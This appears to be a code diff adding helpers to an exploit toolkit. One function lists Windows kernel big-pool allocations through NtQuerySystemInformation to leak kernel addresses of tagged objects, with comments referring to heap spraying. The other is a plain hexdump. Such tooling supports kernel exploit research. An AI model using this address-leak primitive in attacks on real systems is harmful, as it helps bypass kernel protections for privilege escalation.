@@ -205,6 +205,107 @@ namespace exploit
             return false;
         }
 
+        unsigned long long ulFindKernelPoolAddress(ULONG targetTag, SIZE_T targetSize, PUINT64 outAddresses, ULONG maxCount) {
+            ULONG retlen = 0;
+            ULONG foundCount = 0;
+            NTSTATUS status;
+
+            //import function `NtQuerySystemInformation`
+            HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
+            PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
+            if (NtQuerySystemInformation == NULL) {
+                printf("[!] GetProcAddress() failed.\n");
+                return 0;
+            }
+
+            // 1. 初始分配 4KB 试探大小
+            ULONG bufferSize = 0x1000;
+            PVOID buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if (!buffer) return 0;
+
+            // 2. 循环获取足够大的缓冲区
+            while (1) {
+                status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemBigPoolInformation, buffer, bufferSize, &retlen);
+
+                if (status == 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
+                    VirtualFree(buffer, 0, MEM_RELEASE);
+                    bufferSize = retlen + 0x1000; // 多分配一点防止竞态
+                    buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                    if (!buffer) return 0;
+                }
+                else if (NT_SUCCESS(status)) {
+                    break; // 获取成功
+                }
+                else {
+                    VirtualFree(buffer, 0, MEM_RELEASE);
+                    return 0; // 其他错误
+                }
+            }
+
+            // 3. 解析数据
+            PSYSTEM_BIGPOOL_INFORMATION pBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)buffer;
+
+            // 倒序遍历（从最新分配的向最早分配找，堆喷射等场景下目标对象通常是最近分配的）
+            for (int i = pBigPoolInfo->Count - 1; i >= 0; --i) {
+                PSYSTEM_BIGPOOL_ENTRY entry = &pBigPoolInfo->AllocatedInfo[i];
+
+                // 判断 Size 是否匹配（如果 targetSize 不为 0）
+                if (targetSize != 0 && entry->SizeInBytes != targetSize) {
+                    continue;
+                }
+
+                // 判断 Tag 是否匹配
+                if (entry->TagUlong != targetTag) {
+                    continue;
+                }
+
+                // 获取地址，并清除最低位的 NonPaged 标志 (Bit 0)
+                UINT64 realAddress = (UINT64)entry->VirtualAddress & 0xFFFFFFFFFFFFFFFE;
+
+                // 保存结果
+                if (foundCount < maxCount && outAddresses) {
+                    outAddresses[foundCount] = realAddress;
+                }
+                foundCount++;
+            }
+
+            VirtualFree(buffer, 0, MEM_RELEASE);
+            return foundCount;
+        }
+
+        void hexdump(const void* data, ULONG size)
+        {
+            const unsigned char* p = (const unsigned char*)data;
+            ULONG i, j;
+
+            for (i = 0; i < size; i += 16)
+            {
+                // 偏移
+                printf("%08zx  ", i);
+
+                // hex 区
+                for (j = 0; j < 16; j++)
+                {
+                    if (i + j < size)
+                        printf("%02X ", p[i + j]);
+                    else
+                        printf("   ");
+
+                    if (j == 7) printf(" "); // 中间分隔
+                }
+
+                printf(" ");
+
+                // ASCII 区
+                for (j = 0; j < 16 && i + j < size; j++)
+                {
+                    unsigned char c = p[i + j];
+                    printf("%c", isprint(c) ? c : '.');
+                }
+
+                printf("\n");
+            }
+        }
 
     } // namespace memtools
 
